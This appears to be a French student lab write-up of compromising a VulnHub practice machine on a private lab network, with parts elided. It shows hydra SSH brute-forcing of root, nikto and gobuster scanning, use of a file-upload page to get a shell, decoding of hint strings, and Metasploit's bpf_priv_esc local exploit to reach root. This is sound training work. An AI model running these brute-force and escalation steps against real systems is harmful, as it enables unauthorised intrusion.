...
`sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-passwords.txt -t 6 ssh://10.0.2.8`
...
La page vulnhub fournit un indice : je peux essayer de faire un scan nikto sur l'adresse ip de la machine cible en sachant que nikto est sensible à la casse. J'en déduis donc que cette machine contient des fichiers potentiellement en majuscules.

`nikto -h 10.0.2.8`

Je n'ai rien trouvé de spécial en faisant ce scan, mais après queques essais aléatoires, j'ai finalement tapé l'url `10.0.2.8/ROBOTS.TXT` qui m'a amené sur cette page.

![1733419706315](image/rapport-tp5/1733419706315.png)

Visiblement, le téléchargement semble interdit. Il y a un dossier upload.

Et en déscendant un peu :

![1733419677023](image/rapport-tp5/1733419677023.png)

Le téléchargement du répertoire /igmseklhgmrjmtherij2145236 semble donc être interdit. En essayant de me rendre à l'url `10.0.2.8/igmseklhgmrjmtherij2145236` j'obtiens un message d'erreur "Forbidden".

Je vais essayer de réaliser une attaque brute force sur le répertoire "igmseklhgmrjmtherij2145236" en utilisant l'outil gobuster.
...
Je me rend donc à l'url `http://10.0.2.8/igmseklhgmrjmtherij2145236/upload.php` et je tombe sur une mini page web dans laquelle je peux upload un fichier.
...
Dans mon terminal, on observe que la conexion se fait et je peux accéder au shell.
...
Je fais donc un cat pour le lire :
...
"++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.>++++.---.<<++.>>+++++++++.---------.+++++++++++++++++++.----.<<.>>------------.+.+++++.++++++.<<.>>-----------.++++++++++.<<.>>-------.+++.------------.--.+++++++++++++++++++.---------------.-.<<.>>+++++.+++++.<<++++++++++++++++++++++++++.", qui d'après ChatGPT, est un message codé en brainfuck, un langage de programmation minimaliste souvent utilisé pour des énigmes. On peut utiliser un décodeur de brainfuck sur internet pour obtenir le message suivant : "The next hint is located in:" (l'indice suivant se trouve dans :). Pour l'instant, cela ne nous aide pas trop.

"Tm8gaGludHMgaGVyZSAhCg==", est un message encodé en Base64 et que je peux traduire par en allant sur un décodeur de base64. Cela sgnifie "No hint here !" (pas d'indice ici), je passe donc au suivant.

"KNSWC4TDNAQGM33SEB2G6ZDPOMXA====", est encodé en Base32 et se traduit par "Search for todos.".
...
On va déplacer ce fichier dans le dossier tmp.
...
En affichant les options, on constate que LHOST (qui spécifie l'IP de la machine attaquante) n'est pas définie. On va donc la définir avec l'IP de la machine kali (`set lhost 10.0.2.4`).
...
Metasploit nous suggère un exploit que l'on va utiliser `use post/multi/recon/local_exploit_suggester`
...
Cela nous propose une liste d'xploit à utiliser. Je choisi le premier : `use exploit/linux/local/bpf_priv_esc`.
...
On peut lancer à l'exploit, une nouvelle session est créée. Je lance un shell et je peux constater que je suis bien utilisateur root.
